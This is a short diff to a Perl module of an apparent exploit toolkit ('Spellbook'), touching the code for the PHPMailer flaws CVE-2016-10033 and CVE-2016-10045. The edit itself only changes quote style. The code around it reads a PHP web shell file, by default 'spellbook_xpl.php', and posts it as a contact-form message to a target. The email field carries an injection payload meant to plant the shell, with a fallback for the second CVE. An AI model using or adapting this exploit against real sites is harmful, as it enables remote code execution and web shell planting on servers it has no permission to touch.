@@ -31,7 +31,7 @@ package Spellbook::Advisory::CVE_2016_10045 {
 
             my $userAgent = Spellbook::Core::UserAgent -> new();
 
-            if ($shell{"name"} ne "spellbook_xpl.php") {
+            if ($shell{'name'} ne 'spellbook_xpl.php') {
                 my $code = Mojo::File -> new($shell{name});
 
                 $shell{code} = $code -> slurp();
@@ -42,21 +42,21 @@ package Spellbook::Advisory::CVE_2016_10045 {
             
             try {
                 my $request = $userAgent -> post($target, [
-                    "action"  => "send",
-                    "name"    => "Jas Fasola",
-                    "subject" => "Lorem ipsum",
-                    "email"   => $CVE_2016_10033,
-                    "message" => $shell{code}
+                    'action'  => "send",
+                    'name'    => "Jas Fasola",
+                    'subject' => "Lorem ipsum",
+                    'email'   => $CVE_2016_10033,
+                    'message' => $shell{code}
                 ]);
             }
 
             catch {
                 my $request = $userAgent -> post($target, [
-                    "action"  => "send",
-                    "name"    => "Jas Fasola",
-                    "subject" => "Lorem ipsum",
-                    "email"   => $CVE_2016_10045,
-                    "message" => $shell{code}
+                    'action'  => "send",
+                    'name'    => "Jas Fasola",
+                    'subject' => "Lorem ipsum",
+                    'email'   => $CVE_2016_10045,
+                    'message' => $shell{code}
                 ]);
             };
 
